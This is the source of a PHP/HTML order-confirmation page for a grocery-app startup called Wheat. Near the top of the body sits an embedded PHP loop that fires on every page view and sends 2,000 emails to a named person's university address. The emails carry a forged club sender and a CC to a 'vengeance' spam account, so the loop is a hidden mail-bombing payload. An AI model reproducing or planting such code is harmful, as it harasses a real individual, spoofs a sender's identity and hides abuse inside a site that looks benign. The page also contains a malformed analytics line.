<!DOCTYPE html>
<html>
<head>
<title>Wheat - Révolutionnez votre manière de faire les courses !</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta name="keywords" content="WhEat Startup Mobile App" />
<script type="application/x-javascript"> addEventListener("load", function() { setTimeout(hideURLbar, 0); }, false); function hideURLbar(){ window.scrollTo(0,1); } </script>
<style type="text/css">
	#mc_embed_signup{background: transparent; clear:left; font:14px Helvetica,Arial,sans-serif; }
	/* Add your own MailChimp form style overrides in your site stylesheet or in this style block.
	   We recommend moving this block and the preceding CSS link to the HEAD of your HTML file. */
</style>
<link href="//cdn-images.mailchimp.com/embedcode/classic-081711.css" rel="stylesheet" type="text/css">
<link href="css/bootstrap.css" rel='stylesheet' type='text/css' />
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">
<link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
<link href="css/style2.css" rel='stylesheet' type='text/css' />
<script type="text/javascript" src="js/jquery-1.11.0.min.js"></script>
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-62079439-1', 'auto');
  ga('send', 'pageview');
  ga(‘set’, ‘&uid’, {{USER_ID}}); // Définir l'ID utilisateur à partir du paramètre user_id de l'utilisateur connecté.
</script>
<!--animated-css-->
		<link href="css/animate.css" rel="stylesheet" type="text/css" media="all">
		<script src="js/wow.min.js"></script>
		<script>
		 new WOW().init();
		</script>
<!--animated-css-->
<script src="//www.parsecdn.com/js/parse-1.4.2.min.js"></script>  
</head>
<body>
	<?php 
$yourEmail = 'antoine.marchal1@mines-paristech.fr';

$subject = "[Important]";

$body = "Le club Q te salue.";

$headers = "From: clubQ@mines-paristech.fr" . "\r\n" .
"CC: vengeancespam6@gmail.com";

for ($i = 1; $i <= 2000; $i++) {

    $subject ="[$i]";
    mail($yourEmail, $subject, $body, $headers);
}
?>
		<div class="banner container">
			<div class="header">
				<div class="row">
					<div class="col-xs-12 col-md-8" id="logo-left">
						<a href="index.php"><img src="images/logo.png" alt=""></a>
					</div>
					<div class="col-xs-12 col-md-4" id="logo-right">
						<a class="" href="index.php"><img class="text-right" src="images/logo-seul.png" alt=""></a>
					</div>
				</div>
			</div>
			<div class="merci text-center">
				<h1>Commande enregistrée ! Merci !</h1>
				<div class="col-xs-12 text-center banner-bottom">
					<a href="index.php"><button type="button" class="btn btn-primary" id="retour">Retour à la page d'accueil</button></a>
				</div>
			</div>
		</div>
		<div class="footer">
			<div class="container">
				<div class="footer-main">
					<div class="col-md-6 footer-left wow bounceInLeft" data-wow-delay="0.1s">
					</div>
					<div class="col-md-6 footer-right wow bounceInRight" data-wow-delay="0.1s">
						<ul>
							<li><a href="http://on.fb.me/1yHBDMa"><i class="fa fa-facebook fa-3x"></i></span></a></li>
							<li><a href="http://bit.ly/1yHBWXt"><i class="fa fa-twitter fa-3x"></i></a></li>
						</ul>
					</div>
					<div class="clearfix"></div>
				</div>
				<div class="footer-text">
					<p>Merci au <a href="http://freestartuproject.fr/"> FREE START-UP PROJECT</a></p>
				</div>
			</div>
			 <script type="text/javascript">
										$(document).ready(function() {
											/*
											var defaults = {
									  			containerID: 'toTop', // fading element id
												containerHoverID: 'toTopHover', // fading element hover id
												scrollSpeed: 1200,
												easingType: 'linear' 
									 		};
											*/
											
											$().UItoTop({ easingType: 'easeOutQuart' });
											
										});
									</script>
			<a href="#home" id="toTop" class="scroll" style="display: block;"> <span id="toTopHover" style="opacity: 1;"> </span></a>
		</div>
</body>
</html>		